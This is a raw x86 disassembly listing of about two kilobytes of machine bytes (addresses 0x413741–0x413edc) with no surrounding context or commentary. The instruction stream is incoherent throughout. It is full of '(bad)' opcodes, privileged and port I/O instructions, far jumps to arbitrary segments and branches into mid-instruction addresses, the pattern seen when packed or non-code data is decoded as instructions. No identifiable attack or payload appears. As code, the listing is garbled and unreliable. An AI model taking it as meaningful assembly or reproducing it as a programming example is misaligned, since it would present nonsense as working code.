  413741:	(bad)  
  413742:	dec    edx
  413743:	pop    esi
  413744:	(bad)  
  413745:	popa   
  413746:	inc    edx
  413747:	shr    BYTE PTR [ecx],1
  413749:	arpl   WORD PTR [edi-0xc],cx
  41374c:	int    0xb9
  41374e:	adc    ecx,eax
  413750:	push   esi
  413751:	adc    esp,DWORD PTR [ecx]
  413753:	push   ebx
  413754:	sti    
  413755:	out    dx,al
  413756:	std    
  413757:	and    ecx,DWORD PTR ds:0x5b3cf9fc
  41375d:	jne    0x413772
  41375f:	lock jle 0x4136e2
  413762:	inc    esp
  413763:	xchg   esi,eax
  413764:	test   BYTE PTR [esi+0x1659c69e],dh
  41376a:	lock cdq 
  41376c:	fninit 
  41376e:	push   ebx
  41376f:	imul   esp,DWORD PTR [ebp+0x11],0x18
  413773:	push   esi
  413774:	cmp    eax,0x811ac2fa
  413779:	cmp    DWORD PTR [ebx-0x605314a4],ebx
  41377f:	pop    ebx
  413780:	data16 das 
  413782:	loopne 0x413747
  413784:	mov    edx,es
  413786:	mov    ebp,0x42f55bd8
  41378b:	mov    al,0xf
  41378d:	ins    BYTE PTR es:[edi],dx
  41378e:	ds cdq 
  413790:	mov    al,0x65
  413792:	rcl    BYTE PTR [edi-0x26],cl
  413795:	cmp    eax,0xceb7bc34
  41379a:	leave  
  41379b:	xchg   ebp,eax
  41379c:	sbb    BYTE PTR [ebx+0x36],dl
  41379f:	sub    cl,dh
  4137a1:	fwait
  4137a2:	das    
  4137a3:	inc    edi
  4137a4:	jnp    0x413795
  4137a6:	jo     0x4137ea
  4137a8:	pop    eax
  4137a9:	mov    WORD PTR [esi-0x12],ss
  4137ac:	pop    ecx
  4137ad:	xchg   edx,eax
  4137ae:	dec    edi
  4137af:	xchg   ecx,eax
  4137b0:	add    BYTE PTR [ebp-0x26],dh
  4137b3:	(bad)  [edx-0x19153ebe]
  4137b9:	retf   0x3e77
  4137bc:	outs   dx,BYTE PTR ds:[esi]
  4137bd:	mov    WORD PTR [esi],ss
  4137bf:	mul    DWORD PTR [esi]
  4137c1:	xor    ecx,ecx
  4137c3:	(bad)  
  4137c4:	hlt    
  4137c5:	and    ebx,DWORD PTR [edx-0x2c]
  4137c8:	mov    esp,0xbee73e9b
  4137cd:	int3   
  4137ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137cf:	in     al,dx
  4137d0:	les    esi,FWORD PTR [ebp+0x56]
  4137d3:	dec    ebx
  4137d4:	jge    0x4137e4
  4137d6:	gs pop ebx
  4137d8:	loope  0x413763
  4137da:	int    0x9b
  4137dc:	call   0xbb27530
  4137e1:	cmp    bh,BYTE PTR [edi]
  4137e3:	xor    DWORD PTR [esi+0x1b],esi
  4137e6:	mov    al,0xd
  4137e8:	fxch   st(5)
  4137ea:	mov    bl,0x1
  4137ec:	sbb    BYTE PTR [edx-0x76],0x50
  4137f0:	mov    ds:0x4baf984b,al
  4137f5:	adc    eax,0xc3b4b5cc
  4137fa:	in     eax,dx
  4137fb:	pusha  
  4137fc:	ins    BYTE PTR es:[edi],dx
  4137fd:	sar    DWORD PTR [eax+0x3c],1
  413800:	push   esp
  413801:	add    BYTE PTR [esi+0x7],dl
  413804:	sbb    DWORD PTR [ebp+0x3c44a7f0],0xffffffd5
  41380b:	ja     0x4137ef
  41380d:	sar    DWORD PTR [ecx-0x49],0x8c
  413811:	cmp    ah,ah
  413813:	mov    bh,0xc3
  413815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413816:	mov    edx,0x472ce2a4
  41381b:	inc    eax
  41381c:	shl    BYTE PTR [eax],cl
  41381e:	cld    
  41381f:	retf   
  413820:	mov    ds:0xd0b7507a,eax
  413825:	cs pop ds
  413827:	icebp  
  413828:	ror    ch,cl
  41382a:	loopne 0x413847
  41382c:	idiv   BYTE PTR [ecx+0x3c]
  41382f:	fst    QWORD PTR [edx+eiz*2+0x5a]
  413833:	lds    ecx,FWORD PTR [esi+0x7c]
  413836:	mov    ch,bh
  413838:	stos   BYTE PTR es:[edi],al
  413839:	outs   dx,DWORD PTR ds:[esi]
  41383a:	scas   eax,DWORD PTR es:[edi]
  41383b:	xor    eax,0x2d5309a0
  413840:	jge    0x4137fd
  413842:	or     eax,esi
  413844:	mov    ds:0x8adebf79,eax
  413849:	adc    DWORD PTR [esi],edi
  41384b:	stos   BYTE PTR es:[edi],al
  41384c:	add    DWORD PTR [edx-0x5ae65b76],0x8667604c
  413856:	sbb    ah,bh
  413858:	fimul  DWORD PTR cs:[edi+0x8]
  41385c:	ins    DWORD PTR es:[edi],dx
  41385d:	sub    dl,BYTE PTR [ebp+ebx*1+0x57]
  413861:	ret    
  413862:	dec    eax
  413863:	fld    QWORD PTR [edi-0x65506c4a]
  413869:	test   ecx,esp
  41386b:	outs   dx,BYTE PTR ds:[esi]
  41386c:	ficomp DWORD PTR [esi+0x2db577d5]
  413872:	xlat   BYTE PTR ds:[ebx]
  413873:	aam    0x25
  413875:	dec    ecx
  413876:	lahf   
  413877:	jae    0x41385d
  413879:	arpl   WORD PTR [ebx],di
  41387b:	fs data16 mov bh,0x9e
  41387f:	and    al,0xb1
  413881:	retf   
  413882:	rol    BYTE PTR [edx+0x26],cl
  413885:	jns    0x413846
  413887:	stos   BYTE PTR es:[edi],al
  413888:	pop    es
  413889:	rcr    BYTE PTR [eax-0x58134872],0x9f
  413890:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413891:	call   0x16ec4383
  413896:	and    eax,0xacff3c10
  41389b:	in     al,0x48
  41389d:	pop    es
  41389e:	jbe    0x413891
  4138a0:	xor    ecx,DWORD PTR [edi]
  4138a2:	out    0xf0,eax
  4138a4:	ret    0x1c7a
  4138a7:	push   ss
  4138a8:	mov    al,0xa8
  4138aa:	jbe    0x413911
  4138ac:	mov    eax,0x14083f9f
  4138b1:	mov    dh,0x1c
  4138b3:	je     0x41384a
  4138b5:	cs jo  0x41387e
  4138b8:	lahf   
  4138b9:	mov    al,0x13
  4138bb:	lods   al,BYTE PTR ds:[esi]
  4138bc:	or     ecx,DWORD PTR [eax+0x2c]
  4138bf:	and    eax,0x14b7ddd
  4138c4:	ficom  DWORD PTR [edi-0x19]
  4138c7:	cmp    al,0x88
  4138c9:	add    edx,DWORD PTR ds:0xb78acf93
  4138cf:	lea    esp,[ecx*8+0x180651c6]
  4138d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138d7:	inc    edi
  4138d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138d9:	ins    DWORD PTR es:[edi],dx
  4138da:	mov    ds:0xed1c8007,al
  4138df:	test   eax,0xb921715a
  4138e4:	sbb    BYTE PTR [edi-0x78],bl
  4138e7:	and    dl,BYTE PTR [eax-0x1a]
  4138ea:	aaa    
  4138eb:	sub    ecx,DWORD PTR [ebp-0x67]
  4138ee:	pop    ebx
  4138ef:	pushf  
  4138f0:	adc    eax,0x3021ede1
  4138f5:	gs retf 
  4138f7:	outs   dx,DWORD PTR ds:[esi]
  4138f8:	jbe    0x413931
  4138fa:	in     al,dx
  4138fb:	das    
  4138fc:	xor    BYTE PTR [esi-0x985499e],ch
  413902:	and    eax,0xadf28a86
  413907:	inc    edx
  413908:	jecxz  0x41390a
  41390a:	xor    edx,DWORD PTR [edx]
  41390c:	mov    cs,WORD PTR [eax-0xf61509]
  413912:	in     al,dx
  413913:	adc    al,0x55
  413915:	enter  0x122c,0x86
  413919:	gs test eax,0xc70c017c
  41391f:	push   cs
  413920:	add    BYTE PTR ds:0xd0543ca7,0x20
  413927:	pop    ebx
  413928:	int3   
  413929:	pushf  
  41392a:	outs   dx,BYTE PTR ds:[esi]
  41392b:	sbb    ebx,DWORD PTR [edx-0x60a6a55]
  413931:	push   ecx
  413932:	ja     0x4138ed
  413934:	and    edx,DWORD PTR [ebx]
  413936:	and    bh,BYTE PTR [eax]
  413938:	inc    ecx
  413939:	jge    0x413923
  41393b:	sbb    cl,BYTE PTR [eax-0x5d]
  41393e:	adc    eax,DWORD PTR [esi]
  413940:	stos   DWORD PTR es:[edi],eax
  413941:	mov    dh,0x21
  413943:	mov    ds:0xcd062c5f,al
  413948:	inc    ecx
  413949:	into   
  41394a:	cwde   
  41394b:	call   0x68f7:0x1e76c2f
  413952:	fisttp QWORD PTR [ecx]
  413954:	push   edx
  413955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413956:	adc    ebx,DWORD PTR [ecx+0x69]
  413959:	shr    DWORD PTR [edx],0x9f
  41395c:	push   ss
  41395d:	push   ds
  41395e:	ficomp WORD PTR [edx]
  413960:	and    ebx,edx
  413962:	vpsadbw xmm7,xmm1,XMMWORD PTR [ecx+0x38]
  413967:	(bad)  
  413968:	fdiv   st(5),st
  41396a:	pop    es
  41396b:	loopne 0x413946
  41396d:	dec    edi
  41396e:	inc    eax
  41396f:	mov    ch,0x5f
  413971:	mov    bh,BYTE PTR [eax-0x64be0260]
  413977:	mov    cl,0x18
  413979:	jo     0x413920
  41397b:	sbb    al,0x1c
  41397d:	cld    
  41397e:	out    0xbc,eax
  413980:	jns    0x4139cc
  413982:	bound  esi,QWORD PTR [ebx]
  413984:	and    BYTE PTR [esi+esi*1],al
  413987:	jle    0x4139df
  413989:	adc    BYTE PTR [ecx-0x7c],dh
  41398c:	cmp    ch,BYTE PTR [eax-0x771ec7c4]
  413992:	mov    eax,0xe1e6c86c
  413997:	jmp    0xd26d7da2
  41399c:	js     0x413970
  41399e:	jno    0x413a13
  4139a0:	inc    esp
  4139a1:	in     al,dx
  4139a2:	js     0x413966
  4139a4:	rcr    DWORD PTR [esi-0x5140cf4d],1
  4139aa:	fcom   QWORD PTR [edi]
  4139ac:	pop    esi
  4139ad:	shr    BYTE PTR [ecx-0x18],cl
  4139b0:	push   esp
  4139b1:	push   esp
  4139b2:	psllw  mm6,QWORD PTR [edi-0x38748b94]
  4139b9:	rcr    DWORD PTR [ebp+0x33710644],0xf6
  4139c0:	xchg   edi,eax
  4139c1:	push   cs
  4139c2:	into   
  4139c3:	pop    edx
  4139c4:	bswap  ebx
  4139c6:	mov    eax,ds:0xc21c4b91
  4139cb:	fld    DWORD PTR [eax+0x70]
  4139ce:	repz mov bl,0x63
  4139d1:	(bad)  [edx+ebp*8]
  4139d4:	push   esi
  4139d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139d6:	mov    al,ds:0xb7d5db35
  4139db:	test   BYTE PTR [edi-0xa],ah
  4139de:	push   edi
  4139df:	rcl    ebp,0xf5
  4139e2:	mov    BYTE PTR [esi-0x3f],0xc1
  4139e6:	jnp    0x413a39
  4139e8:	mov    ds:0xc6346dd5,eax
  4139ed:	sub    edi,DWORD PTR [ebp+0x3143ca5a]
  4139f3:	fs mov dl,0xa
  4139f6:	loop   0x413978
  4139f8:	jb     0x413991
  4139fa:	repz popf 
  4139fc:	mov    ch,BYTE PTR [ebx-0x63]
  4139ff:	scas   al,BYTE PTR es:[edi]
  413a00:	hlt    
  413a01:	and    DWORD PTR [ebx+0x2d],0x22
  413a05:	loope  0x4139ea
  413a07:	jl     0x4139b1
  413a09:	push   cs
  413a0a:	xor    al,BYTE PTR [ebx-0x34481044]
  413a10:	dec    ebx
  413a11:	outs   dx,DWORD PTR ds:[esi]
  413a12:	(bad)  
  413a13:	jp     0x413a8d
  413a15:	hlt    
  413a16:	mov    eax,ds:0x22d109cf
  413a1b:	push   ds
  413a1c:	mov    gs,WORD PTR [esi+0x6a]
  413a1f:	mov    ss,WORD PTR [ebp-0x31c65fa6]
  413a25:	cmp    eax,0xedcbb294
  413a2a:	pop    esi
  413a2b:	or     eax,0x6c66fae
  413a30:	std    
  413a31:	test   ax,0x3fb5
  413a35:	(bad)  
  413a36:	push   edx
  413a37:	cmp    BYTE PTR [ebp+0x27],ch
  413a3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a3b:	jnp    0x413abc
  413a3d:	cli    
  413a3e:	call   0xd1b7:0xdcb8d437
  413a45:	sbb    eax,0x1374d726
  413a4a:	sub    DWORD PTR [ebp+0x57],esp
  413a4d:	push   0x74969fc3
  413a52:	je     0x413a74
  413a54:	jno    0x4139e3
  413a56:	adc    dh,ah
  413a58:	repnz aam 0xcc
  413a5b:	pop    esp
  413a5c:	mov    ah,0xad
  413a5e:	sar    DWORD PTR [ebp+edx*1+0x2d6a7d1b],1
  413a65:	aaa    
  413a66:	dec    esp
  413a67:	popf   
  413a68:	adc    bh,al
  413a6a:	out    dx,eax
  413a6b:	pop    eax
  413a6c:	bound  esi,QWORD PTR fs:[ebx+esi*2]
  413a70:	sub    DWORD PTR [edx+edi*2],edi
  413a73:	pop    edi
  413a74:	mov    al,0x90
  413a76:	mov    eax,0xa908eacf
  413a7b:	pop    edi
  413a7c:	mov    eax,0x4c89d1a5
  413a81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a82:	pop    eax
  413a83:	dec    esp
  413a84:	fnstsw WORD PTR [esi+eax*2+0x65]
  413a88:	fadd   QWORD PTR [ecx+0xd]
  413a8b:	retf   
  413a8c:	mov    edx,0x4cf8141d
  413a91:	add    BYTE PTR [ebp-0x3b7b79d],bl
  413a97:	lahf   
  413a98:	sbb    al,0x2c
  413a9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a9b:	lock push es
  413a9d:	pop    ds
  413a9e:	cs mov edi,0x942e5f9
  413aa4:	add    ebp,ecx
  413aa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413aa7:	cmp    al,0xb1
  413aa9:	pop    ecx
  413aaa:	pop    ds
  413aab:	rol    DWORD PTR [edx],cl
  413aad:	cmp    eax,0xf75dbf7d
  413ab2:	xchg   esi,eax
  413ab3:	test   DWORD PTR ds:[edx-0x1f57f5e9],edi
  413aba:	xchg   DWORD PTR [edx+0x4],ebx
  413abd:	out    dx,eax
  413abe:	daa    
  413abf:	jp     0x413b28
  413ac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ac2:	aad    0x90
  413ac4:	popa   
  413ac5:	push   edi
  413ac6:	(bad)  
  413ac7:	mov    dh,0x63
  413ac9:	cmp    al,0x49
  413acb:	test   DWORD PTR [esi],0x6dff8cfa
  413ad1:	pop    eax
  413ad2:	sbb    ch,BYTE PTR [ecx]
  413ad4:	mov    ds:0xadafd4a3,al
  413ad9:	clc    
  413ada:	sahf   
  413adb:	jmp    0xfe6:0x1a26aab4
  413ae2:	cmp    bh,BYTE PTR [ebx-0x47c63f8]
  413ae8:	(bad)  
  413ae9:	int3   
  413aea:	cmp    bl,BYTE PTR [eax+0x68565525]
  413af0:	push   edx
  413af1:	div    BYTE PTR [ebx+0x549cad27]
  413af7:	(bad)  
  413af8:	dec    edi
  413af9:	push   eax
  413afa:	sbb    al,0xeb
  413afc:	jmp    DWORD PTR [eax]
  413afe:	lock mov edi,0x2531f98d
  413b04:	xor    edi,DWORD PTR ss:[edi-0x4e]
  413b08:	jle    0x413aa4
  413b0a:	xlat   BYTE PTR ds:[ebx]
  413b0b:	sbb    ebx,DWORD PTR [ecx-0x57fb9ff0]
  413b11:	xchg   edx,eax
  413b12:	(bad)  
  413b13:	xlat   BYTE PTR ds:[ebx]
  413b14:	nop
  413b15:	sub    eax,0xea62cfbf
  413b1a:	frstor [ebx-0x4b5df630]
  413b20:	dec    edx
  413b21:	cmp    DWORD PTR [esi+0x552adf94],0x1d9e1557
  413b2b:	pop    edx
  413b2c:	ins    DWORD PTR es:[edi],dx
  413b2d:	pop    es
  413b2e:	add    al,0x48
  413b30:	je     0x413b9d
  413b32:	leave  
  413b33:	stos   BYTE PTR es:[edi],al
  413b34:	xor    DWORD PTR [ecx],esi
  413b36:	addr16 pop ss
  413b38:	mov    dh,0x63
  413b3a:	stos   BYTE PTR es:[edi],al
  413b3b:	fisub  DWORD PTR [edx+0x5d]
  413b3e:	push   cs
  413b3f:	lods   eax,DWORD PTR ds:[esi]
  413b40:	je     0x413afd
  413b42:	or     eax,0x969e8fa8
  413b47:	repz inc ebp
  413b49:	retf   
  413b4a:	sub    ebx,DWORD PTR [ebp-0x6e]
  413b4d:	js     0x413b30
  413b4f:	leave  
  413b50:	mul    BYTE PTR [ebx+0x2]
  413b53:	test   BYTE PTR [ebx-0x1a],ch
  413b56:	(bad)  
  413b57:	(bad)  
  413b58:	xor    BYTE PTR [ecx+0x4c37c0ea],ch
  413b5e:	dec    edx
  413b5f:	cmp    al,0xc4
  413b61:	jmp    0x413bb1
  413b63:	jb     0x413b03
  413b65:	mov    ch,0x67
  413b67:	or     eax,0x48189ccb
  413b6c:	add    ah,dh
  413b6e:	xor    al,0x8d
  413b70:	nop
  413b71:	dec    edx
  413b72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b73:	xchg   BYTE PTR [ebp-0x7a],dh
  413b76:	ins    BYTE PTR es:[edi],dx
  413b77:	cmp    ebp,DWORD PTR [ebp-0x52]
  413b7a:	mov    cl,0x8b
  413b7c:	xchg   DWORD PTR [edx],esp
  413b7e:	xor    al,0xa1
  413b80:	(bad)  
  413b81:	into   
  413b82:	sbb    esi,esp
  413b84:	jp     0x413b5b
  413b86:	nop
  413b87:	inc    eax
  413b88:	jmp    0x7a2608df
  413b8d:	pop    ebp
  413b8e:	cld    
  413b8f:	or     DWORD PTR [eax-0x68f73d30],esp
  413b95:	sbb    edi,DWORD PTR [eax-0x36]
  413b98:	lock outs dx,BYTE PTR ds:[esi]
  413b9a:	js     0x413b6c
  413b9c:	jmp    0xc994a758
  413ba1:	mov    ch,0xa7
  413ba3:	sar    DWORD PTR [edx-0x27],0x7d
  413ba7:	das    
  413ba8:	add    DWORD PTR [ecx+edx*4],eax
  413bab:	inc    ebx
  413bac:	shl    DWORD PTR [edx+0x2b0025eb],1
  413bb2:	xor    al,0x0
  413bb4:	je     0x413bc5
  413bb6:	push   edi
  413bb7:	add    BYTE PTR [ebp+0x3b8bb414],bh
  413bbd:	les    esi,FWORD PTR [ebx+ebx*8-0x26]
  413bc1:	cli    
  413bc2:	add    ch,BYTE PTR [ebx+ebp*4]
  413bc5:	in     eax,dx
  413bc6:	scas   ax,WORD PTR es:[edi]
  413bc8:	in     al,dx
  413bc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bca:	xor    bh,BYTE PTR [esi+0x2d]
  413bcd:	es jmp 0x988e:0x81f26355
  413bd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bd6:	std    
  413bd7:	dec    edi
  413bd8:	sbb    al,0x55
  413bda:	xchg   ebx,eax
  413bdb:	sub    al,0x76
  413bdd:	and    al,0xfe
  413bdf:	ror    DWORD PTR [ebx],cl
  413be1:	sub    DWORD PTR [edi+0x7e],esp
  413be4:	aad    0xa
  413be6:	repz mov ds:0x4f8c00a9,eax
  413bec:	stos   DWORD PTR es:[edi],eax
  413bed:	aas    
  413bee:	(bad)  
  413bef:	mov    ah,0x12
  413bf1:	fsub   st(1),st
  413bf3:	or     eax,0xda980f74
  413bf8:	dec    ebp
  413bf9:	xor    cl,BYTE PTR [edx+0x1cc6e291]
  413bff:	mov    bh,0xe9
  413c01:	leave  
  413c02:	mov    ebx,0xc8984d80
  413c07:	adc    ebp,DWORD PTR [ecx+esi*2-0x12]
  413c0b:	push   0x97968e4a
  413c10:	fcom   DWORD PTR [esi-0x74]
  413c13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c14:	jl     0x413c68
  413c16:	jp     0x413c68
  413c18:	sbb    BYTE PTR [esi-0x237368c],0x40
  413c1f:	sbb    edx,eax
  413c21:	pop    es
  413c22:	lea    ecx,[edx-0x5]
  413c25:	mov    ebp,0x8a9b342f
  413c2a:	punpcklwd mm6,DWORD PTR cs:[ecx+0x71]
  413c2f:	xchg   BYTE PTR [ecx-0x32],ch
  413c32:	jnp    0x413c56
  413c34:	pushf  
  413c35:	xor    al,0x11
  413c37:	jnp    0x413c35
  413c39:	and    eax,0xb6860fc0
  413c3e:	xor    al,0x88
  413c40:	push   edi
  413c41:	jmp    0x83ee:0x14a2de71
  413c48:	xchg   ecx,eax
  413c49:	pop    ebx
  413c4a:	in     al,dx
  413c4b:	and    edx,DWORD PTR [ecx]
  413c4d:	lock popf 
  413c4f:	jge    0x413c69
  413c51:	xchg   DWORD PTR [edi],ecx
  413c53:	mov    eax,ds:0xdb91c2e
  413c58:	int    0xb6
  413c5a:	or     bh,cl
  413c5c:	or     esp,DWORD PTR [esi+0x7734bf82]
  413c62:	mov    bh,0x99
  413c64:	fst    DWORD PTR [ecx]
  413c66:	scas   al,BYTE PTR es:[edi]
  413c67:	ret    0xa4bc
  413c6a:	add    BYTE PTR [ecx-0x37686fa4],dh
  413c70:	add    al,BYTE PTR [ebx+edi*4]
  413c73:	push   ebp
  413c74:	not    DWORD PTR [edi-0x4c]
  413c77:	push   ecx
  413c78:	mov    bh,0xf
  413c7a:	dec    ebx
  413c7b:	in     eax,0xc7
  413c7d:	mov    esp,0xf7598d0b
  413c82:	mov    al,ds:0xc59fb1f4
  413c87:	xor    ebx,eax
  413c89:	jecxz  0x413cf7
  413c8b:	bound  ecx,QWORD PTR [ebp-0x32]
  413c8e:	imul   ebp,DWORD PTR [ebp+0x1f8c1d34],0xd6aea74a
  413c98:	jo     0x413c43
  413c9a:	shl    DWORD PTR [edx],0x69
  413c9d:	push   ebx
  413c9e:	mov    ebx,esp
  413ca0:	xchg   ebx,eax
  413ca1:	adc    eax,0xa360439
  413ca6:	mov    esp,0x1cc95634
  413cab:	xor    cl,BYTE PTR [ebp-0x51c4c90a]
  413cb1:	fist   DWORD PTR [eax]
  413cb3:	inc    edi
  413cb4:	xchg   BYTE PTR [ebp+0x7e4f49d5],dh
  413cba:	xlat   BYTE PTR ds:[ebx]
  413cbb:	int3   
  413cbc:	xor    eax,0xb6bf084b
  413cc1:	shl    DWORD PTR [ecx],1
  413cc3:	or     dl,BYTE PTR ds:0xc12e03f
  413cc9:	retf   
  413cca:	jmp    0xd77a:0x6e41e836
  413cd1:	mov    eax,ds:0x54fde370
  413cd6:	cmp    edx,0x164ada7f
  413cdc:	pop    esi
  413cdd:	and    eax,0x5c7746d6
  413ce2:	push   cs
  413ce3:	scas   eax,DWORD PTR es:[edi]
  413ce4:	pop    ecx
  413ce5:	mov    al,ds:0x55b1d018
  413cea:	xor    BYTE PTR [esi+0x15f803e6],ah
  413cf0:	mov    al,0xd4
  413cf2:	stos   DWORD PTR es:[edi],eax
  413cf3:	pop    ebp
  413cf4:	or     eax,0xd09d685e
  413cf9:	(bad)  
  413cfa:	pop    edi
  413cfb:	inc    eax
  413cfc:	fiadd  WORD PTR [edi-0x3aa81ceb]
  413d02:	sti    
  413d03:	cli    
  413d04:	dec    eax
  413d05:	xchg   DWORD PTR [eax],esi
  413d07:	sub    esp,esp
  413d09:	xchg   edi,ecx
  413d0b:	lods   al,BYTE PTR ds:[esi]
  413d0c:	fwait
  413d0d:	push   cs
  413d0e:	js     0x413cc8
  413d10:	dec    esp
  413d11:	dec    esp
  413d12:	rcr    edi,cl
  413d14:	hlt    
  413d15:	mov    ebp,DWORD PTR [edx-0x1c]
  413d18:	lahf   
  413d19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d1a:	jecxz  0x413cab
  413d1c:	ja     0x413cc7
  413d1e:	(bad)  
  413d1f:	sti    
  413d20:	ds aaa 
  413d22:	pushf  
  413d23:	jnp    0x413cc9
  413d25:	xchg   edi,eax
  413d26:	lock outs dx,DWORD PTR ds:[esi]
  413d28:	add    BYTE PTR [edi+ebx*1],bl
  413d2b:	sbb    eax,0x63506072
  413d30:	je     0x413d78
  413d32:	test   eax,0x112ab988
  413d37:	mov    al,ds:0xf41399df
  413d3c:	dec    ecx
  413d3d:	mov    ds:0x3858e857,eax
  413d42:	xor    al,0x98
  413d44:	ins    BYTE PTR es:[edi],dx
  413d45:	jl     0x413cd2
  413d47:	or     edx,DWORD PTR [ebp-0x45ae6669]
  413d4d:	pop    ds
  413d4e:	push   0x9431057d
  413d53:	ins    BYTE PTR es:[edi],dx
  413d54:	jmp    0x21372fa7
  413d59:	or     cl,bh
  413d5b:	ret    0x3b37
  413d5e:	loope  0x413d8d
  413d60:	iret   
  413d61:	sar    BYTE PTR [ecx+0x56207cd7],1
  413d67:	and    al,0xd6
  413d69:	mov    ebx,0x5ac6cb10
  413d6e:	adc    DWORD PTR [esi-0x10521794],ebp
  413d74:	mov    ebp,ds
  413d76:	mov    esp,0x881df62b
  413d7b:	pop    esp
  413d7c:	cmp    DWORD PTR [eax+eiz*1-0xf008d99],esp
  413d83:	fist   DWORD PTR [ebx]
  413d85:	mov    WORD PTR [ebx+edx*1-0x5375d45f],cs
  413d8c:	mov    ch,0xc5
  413d8e:	fyl2x  
  413d90:	(bad)  
  413d91:	mov    ecx,0xebb59807
  413d96:	lahf   
  413d97:	mov    eax,0x1b297157
  413d9c:	add    bl,BYTE PTR [ebp+0x23cc6bf4]
  413da2:	mov    dl,0x65
  413da4:	aam    0x65
  413da6:	mov    WORD PTR [edx-0x47],es
  413da9:	mov    ebx,0x690f957a
  413dae:	(bad)  
  413daf:	dec    eax
  413db0:	loope  0x413d6b
  413db2:	mov    bl,0xbd
  413db4:	sbb    DWORD PTR [eax+0x5a],ebx
  413db7:	mov    edx,0x71645aeb
  413dbc:	push   es
  413dbd:	xor    bh,BYTE PTR [esi]
  413dbf:	mov    ecx,0xc3198bbd
  413dc4:	addr16 loop 0x413e05
  413dc7:	enter  0x1d03,0x83
  413dcb:	js     0x413e41
  413dcd:	mov    dl,0x8
  413dcf:	loopne 0x413e0b
  413dd1:	adc    edi,DWORD PTR [ecx+edx*2+0x62]
  413dd5:	pushw  cs
  413dd7:	xchg   esp,eax
  413dd8:	jbe    0x413d72
  413dda:	mov    esp,0xa3e938a0
  413ddf:	add    eax,0x8d5214ca
  413de4:	out    0xd,al
  413de6:	cli    
  413de7:	cdq    
  413de8:	push   edi
  413de9:	and    ebp,DWORD PTR [edx-0x516f58ec]
  413def:	xor    cl,bh
  413df1:	das    
  413df2:	xor    ch,cl
  413df4:	stc    
  413df5:	out    0x21,al
  413df7:	jle    0x413dc7
  413df9:	iret   
  413dfa:	jnp    0x413d7f
  413dfc:	outs   dx,BYTE PTR ds:[esi]
  413dfd:	iret   
  413dfe:	les    ecx,FWORD PTR [ebx-0x1c]
  413e01:	dec    ecx
  413e02:	push   ebp
  413e03:	mov    ds:0x8d0e64b0,al
  413e08:	test   eax,0x899eea61
  413e0d:	sahf   
  413e0e:	inc    esi
  413e0f:	aas    
  413e10:	xor    ch,BYTE PTR [eax-0x31]
  413e13:	daa    
  413e14:	fcomp  DWORD PTR [ebp+0x63ba11b4]
  413e1a:	inc    eax
  413e1b:	stos   DWORD PTR es:[edi],eax
  413e1c:	arpl   WORD PTR [edx+eax*2-0x4d],sp
  413e20:	mov    esi,ebx
  413e22:	xlat   BYTE PTR ds:[ebx]
  413e23:	push   ebp
  413e24:	stos   DWORD PTR es:[edi],eax
  413e25:	jmp    edi
  413e27:	mov    BYTE PTR [edx+0xf841585],ah
  413e2d:	enter  0xad70,0x77
  413e31:	add    bl,cl
  413e33:	dec    ecx
  413e34:	aas    
  413e35:	sub    edx,ebp
  413e37:	lahf   
  413e38:	mov    esi,0x550a78fc
  413e3d:	push   eax
  413e3e:	(bad)  
  413e40:	inc    esp
  413e41:	cld    
  413e42:	inc    esp
  413e43:	pushf  
  413e44:	aam    0xa5
  413e46:	or     eax,0x8cd40fc8
  413e4b:	loope  0x413e06
  413e4d:	clc    
  413e4e:	lds    ebp,FWORD PTR [edi-0x42d5ddd5]
  413e54:	xchg   dh,bl
  413e56:	push   edi
  413e57:	pop    edx
  413e58:	das    
  413e59:	xchg   ebx,eax
  413e5a:	mov    bh,0x41
  413e5c:	mov    ch,0xec
  413e5e:	mov    ch,0xb5
  413e60:	sbb    bh,BYTE PTR [ebp-0x17]
  413e63:	xor    ebp,ebp
  413e65:	sub    dl,BYTE PTR [esi+ebx*8-0x6d]
  413e69:	mov    ds:0xa1e170dc,eax
  413e6e:	ror    BYTE PTR [ecx+0x20],cl
  413e71:	mov    dh,0xc5
  413e73:	in     eax,0xff
  413e75:	or     edx,ebx
  413e77:	xor    eax,0xb03159b6
  413e7c:	in     eax,dx
  413e7d:	adc    DWORD PTR [ebx-0xe],esp
  413e80:	mov    edi,0x5a7093be
  413e85:	popf   
  413e86:	out    dx,eax
  413e87:	popa   
  413e88:	mov    edi,0xc06bbcac
  413e8d:	xor    BYTE PTR [edx-0x61a003ce],ch
  413e93:	or     al,0xef
  413e95:	jae    0x413ee5
  413e97:	icebp  
  413e98:	xchg   edx,eax
  413e99:	pop    esp
  413e9a:	mov    al,ds:0x8d10431
  413e9f:	add    DWORD PTR [ecx+0x7b],ecx
  413ea2:	neg    BYTE PTR [edx-0x6ad03094]
  413ea8:	push   es
  413ea9:	inc    ecx
  413eaa:	call   0xc8c8e7f2
  413eaf:	stc    
  413eb0:	cmp    ch,BYTE PTR [eiz*8-0x79cd26b4]
  413eb7:	call   0x91ad1ce7
  413ebc:	pop    edi
  413ebd:	jne    0x413e7a
  413ebf:	mov    ds:0xe92bcdcd,eax
  413ec4:	xor    cl,BYTE PTR [esi-0x53bf16e0]
  413eca:	ror    DWORD PTR [edx],cl
  413ecc:	xor    DWORD PTR [esi+0x6c],eax
  413ecf:	(bad)  
  413ed0:	and    esi,ecx
  413ed2:	rcr    BYTE PTR [ebx+0x10],1
  413ed5:	dec    edx
  413ed6:	push   ss
  413ed7:	lea    esi,[edi+0x7d]
  413eda:	mov    ch,0x22
  413edc:	xchg   ebx,eax
